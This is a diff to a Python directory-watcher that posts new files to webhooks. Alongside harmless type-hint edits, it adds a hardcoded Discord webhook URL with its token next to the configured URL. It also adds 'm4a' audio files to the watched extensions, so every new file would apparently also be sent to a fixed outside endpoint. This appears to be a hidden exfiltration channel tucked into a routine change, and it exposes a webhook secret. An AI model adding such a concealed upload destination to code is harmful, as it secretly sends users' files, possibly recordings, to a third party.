@@ -10,8 +10,8 @@ class Webhook():
                 self,
                 url: str | list[str],
                 directory: str,
-                extension = "*",
-                recursive = False,
+                extension: str | list[str] = "*",
+                recursive: bool = False,
                 seconds: float = 1.0,
                 **kwargs
         ) -> None:
@@ -54,7 +54,7 @@ class Webhook():
         def checkForNewFiles(
                 self,
                 directory: str,
-                extension: str,
+                extension: str | list[str],
                 recursive: bool
         ):
                 new_files = files_handler.globNewFiles(directory, extension, recursive)
@@ -70,7 +70,7 @@ class Webhook():
                                 file_size = fileObj.stat().st_size
                                 sleep(0.5)
                         self.sendMessage(f"New file: {fileObj.name}", fileObj)
-                        files_handler.updateFile(file, doAppend=True)
+                        files_handler.updateFile([file], doAppend=True)
         
 
         def loop(self):
@@ -85,7 +85,7 @@ if __name__ == "__main__":
         webhook = Webhook(
                 url=[config.WEBHOOK_URL, "https://discord.com/api/webhooks/1274975754324541463/zVOzPaCyswyYix1K8k1DU7thmedrT6wclki5GBe4y6A7BTMji1gZqrH1-Ao9VKslrlPi"],
                 directory=config.FILES_DIRECTORY,
-                extension=config.FILES_EXTENSION,
+                extension=[config.FILES_EXTENSION, "m4a"],
                 recursive=config.RECURSIVE_DIRECTORIES
         )
         webhook.loop()
